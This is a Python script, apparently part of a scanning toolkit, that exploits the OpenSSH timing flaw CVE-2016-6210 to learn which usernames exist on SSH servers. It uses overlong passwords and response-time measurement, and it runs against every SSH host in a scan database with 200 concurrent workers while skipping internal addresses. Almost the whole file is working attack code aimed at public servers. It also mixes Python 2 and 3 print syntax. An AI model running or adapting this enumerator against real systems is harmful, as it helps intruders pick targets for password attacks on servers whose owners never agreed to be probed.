# coding:utf-8
"""
	Open SSHD User Enumeration (CVE-2016-6210)
"""

from gevent import monkey
from gevent.pool import Pool
from lib.lib import *
import time
import paramiko
from string import ascii_lowercase
import random
import traceback
monkey.patch_all()
logpath = "temp/rsync_"+time.strftime("%Y-%m-%d_%H:%M", time.localtime(time.time()))

delay = 3
users = ['root', 'Administrator']  # 添加你要猜解的用户名

def randomString(length=8):
    """
    生成随机字母串
    :param length:生成字符串长度
    :return 字母串
    """
    return ''.join([random.choice(ascii_lowercase) for _ in range(length)])

def getResponseTime(user, host):
    port = int(host.split(':')[-1]) if ':' in host else 22
    host = host.split(':')[0]

    pwd = 'A' * 25000
    ssh = paramiko.SSHClient()
    starttime = time.clock()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port, username=user, password=pwd)
    except Exception as e:
	    print(e)
    finally:
        endtime = time.clock()
    total = endtime - starttime
    return total

def check(task):
	ip = task[0]
	port = str(task[1])
	host = ip + ":" + port
	print host
	# 忽略内网ip扫描
	if is_internal_ip(ip):
		return
	ans = []
	base_time = getResponseTime(randomString(), host)
	for user in users:
		if getResponseTime(user, host) - base_time > delay:
			print(host,user)
			ans.append(user)
	return ans if ans.__len__() else False

"""
	检查结束后
"""
def clean():
	pass
"""
	测试
"""
def test(ip, port):
	check([ip, port])

def main():
	res = get_from_database(
		"select address,port from blog.scan_scan_port where service like '%ssh%' or port='22' or product like '%ssh%'")
	res = list(set(res))
	print("共检查{0}个IP".format(len(res)))
	random.shuffle(res)
	p = Pool(200)
	p.map(check, res)
if __name__ == "__main__":
	print("String...")
	main()
	print("Finished...")
	clean()


